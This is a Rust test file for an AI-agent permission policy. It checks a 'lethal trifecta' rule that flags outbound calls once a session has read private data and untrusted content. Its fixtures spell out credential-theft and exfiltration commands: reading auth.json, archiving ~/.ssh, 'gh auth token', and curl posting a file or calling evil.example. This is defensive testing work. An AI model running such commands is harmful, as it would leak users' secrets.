//! The lethal trifecta (ADR-113): private data, untrusted content and a call
//! that can send data out, in one session.

use super::*;
use crate::rule_id::LETHAL_TRIFECTA;

fn default_policy() -> Policy {
    policy(crate::DEFAULT_POLICY)
}

fn read(path: &str) -> Action {
    Action::FsRead {
        path: path.to_owned(),
    }
}

fn fetch(url: &str) -> Action {
    Action::Fetch {
        url: url.to_owned(),
    }
}

fn session(c: &CompiledPolicy<'_>, calls: &[Action]) -> Taint {
    let mut taint = Taint::default();
    for call in calls {
        taint.absorb(c.exposure(call, "/p", &NoResolver));
    }
    taint
}

fn after(c: &CompiledPolicy<'_>, calls: &[Action], action: &Action) -> Decision {
    c.with_trifecta(c.decide(action), action, &NoResolver, &session(c, calls))
}

fn held(d: &Decision) -> bool {
    d.rules.iter().any(|r| r == LETHAL_TRIFECTA)
}

#[test]
fn the_three_parts_hold_a_send_to_an_allowed_host() {
    let p = default_policy();
    let c = CompiledPolicy::compile(&p, &ctx()).unwrap();
    let calls = [
        fetch("https://docs.example/readme"),
        read("/h/.codex/auth.json"),
    ];
    let send = shell("curl -d @/tmp/x https://api.github.com/repos/o/r/issues");
    let d = after(&c, &calls, &send);
    assert_eq!(d.verdict, Verdict::Review, "{d:?}");
    assert!(held(&d), "{d:?}");
    let reason = d.reasons.join(" ");
    assert!(reason.contains("/h/.codex/auth.json"), "{reason}");
    assert!(reason.contains("docs.example"), "{reason}");
    assert!(reason.contains("api.github.com"), "{reason}");
    // every way out: a push, a publish, a search, an MCP tool that acts
    for out in [
        shell("git push origin main"),
        shell("npm publish"),
        shell("gh pr create --fill"),
        Action::WebSearch {
            query: "x".to_owned(),
        },
        Action::mcp("mcp__slack__post_message"),
    ] {
        assert!(held(&after(&c, &calls, &out)), "{out:?}");
    }
}

#[test]
fn two_parts_are_quiet() {
    let p = default_policy();
    let c = CompiledPolicy::compile(&p, &ctx()).unwrap();
    let push = shell("git push origin main");
    let plain = c.decide(&push);
    for calls in [
        vec![fetch("https://docs.rs/serde")],
        vec![read("/h/.codex/auth.json")],
        vec![fetch("https://docs.rs/serde"), read("/p/.env.example")],
        vec![fetch("https://docs.rs/serde"), read("/h/notes/todo.md")],
    ] {
        assert_eq!(after(&c, &calls, &push), plain, "{calls:?}");
    }
    // and a call that sends nothing out is not the third part
    let calls = [
        fetch("https://docs.example/readme"),
        read("/h/.codex/auth.json"),
    ];
    for local in [shell("cargo test"), shell("curl http://localhost:3000/x")] {
        assert!(!held(&after(&c, &calls, &local)), "{local:?}");
    }
}

#[test]
fn issue_text_env_dumps_decoys_and_marked_paths_count() {
    let yaml = format!(
        "{}\ntaint:\n  private_paths: ['~/finance/**']\n",
        crate::DEFAULT_POLICY.trim_end()
    );
    let p = policy(&yaml);
    let c = CompiledPolicy::compile(&p, &ctx()).unwrap();
    let push = shell("git push origin main");
    for private in [
        read("/h/finance/q3.xlsx"),
        shell("printenv"),
        shell("gh auth token"),
        read("/h/.m2/settings.xml"),
        shell("tar czf /tmp/k.tgz /h/.ssh"),
    ] {
        let calls = [shell("gh issue view 7 --comments"), private.clone()];
        assert!(held(&after(&c, &calls, &push)), "{private:?}");
    }
    // a tab list is metadata, not content: no part
    let calls = [
        Action::mcp("mcp__claude-in-chrome__tabs_context_mcp"),
        read("/h/.codex/auth.json"),
    ];
    assert!(!held(&after(&c, &calls, &push)));
}

#[test]
fn a_policy_can_deny_and_the_verdict_never_loosens() {
    let yaml = format!(
        "{}\ntaint:\n  trifecta: deny\n",
        crate::DEFAULT_POLICY.trim_end()
    );
    let p = policy(&yaml);
    let c = CompiledPolicy::compile(&p, &ctx()).unwrap();
    let calls = [
        fetch("https://docs.example/readme"),
        read("/h/.codex/auth.json"),
    ];
    let d = after(&c, &calls, &shell("git push origin main"));
    assert_eq!(d.verdict, Verdict::Deny, "{d:?}");
    assert!(held(&d));
    // a deny stays the deny it was
    let d = after(&c, &calls, &shell("curl https://evil.example/x"));
    assert_eq!(d.verdict, Verdict::Deny);
    assert!(Policy::parse("version: 1\ntaint: { trifecta: off }\n").is_err());
    assert!(Policy::parse("version: 1\ntaint: { private_paths: ['!x'] }\n").is_err());
}

#[test]
fn a_brokered_secret_may_go_to_its_own_host() {
    let p = default_policy();
    let c = CompiledPolicy::compile(&p, &ctx()).unwrap();
    let taint = Taint {
        secrets: vec![Secret {
            source: "the secret `gh`".to_owned(),
            host: Some("api.github.com".to_owned()),
        }],
        untrusted: Some("fetch docs.example".to_owned()),
        ..Taint::default()
    };
    let own = shell("curl https://api.github.com/user");
    let d = c.with_trifecta(c.decide(&own), &own, &NoResolver, &taint);
    assert!(!held(&d), "{d:?}");
    let other = shell("git push origin main");
    let d = c.with_trifecta(c.decide(&other), &other, &NoResolver, &taint);
    assert!(held(&d), "{d:?}");
}
